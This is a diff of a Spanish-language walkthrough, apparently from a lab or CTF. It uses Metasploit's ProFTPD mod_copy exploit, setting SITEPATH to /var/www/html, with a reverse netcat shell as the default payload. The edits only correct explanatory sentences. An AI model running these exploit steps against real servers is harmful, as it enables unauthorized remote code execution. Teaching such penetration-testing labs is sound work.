@@ -339,7 +339,7 @@ Interact with a module by name or index. For example <font color="#5EBDAB">info 
 <u style="text-decoration-style:solid">msf</u> &gt; use 15
 </pre>
 
-El xploit que coincide con la versión de nuestro programa es el #15 por eso es el que vamos a usar
+El xploit que coincide con la versión de nuestro programa es el #15
 
 <pre><u style="text-decoration-style:solid">msf</u> &gt; use 15
 <font color="#277FFF"><b>[*]</b></font> No payload configured, defaulting to cmd/unix/reverse_netcat
@@ -448,7 +448,7 @@ Ejecutamos el xploit
 <font color="#277FFF"><b>[*]</b></font> Exploit completed, but no session was created.
 <u style="text-decoration-style:solid">msf</u> exploit(<font color="#EC0101"><b>unix/ftp/proftpd_modcopy_exec</b></font>) &gt;</pre>
 
-El error observado como se ve en la antepenultima lina es que el directorio de tiene permisos de escritura vamos a probar con el html
+El error observado como se ve en la antepenultima linea es que el directorio /var/www de tiene permisos de escritura vamos a probar con el /var/www/html (son regularmente los directorios por default)
 
 <pre><u style="text-decoration-style:solid">msf</u> exploit(<font color="#EC0101"><b>unix/ftp/proftpd_modcopy_exec</b></font>) &gt; set SITEPATH /var/www/html
 SITEPATH =&gt; /var/www/html
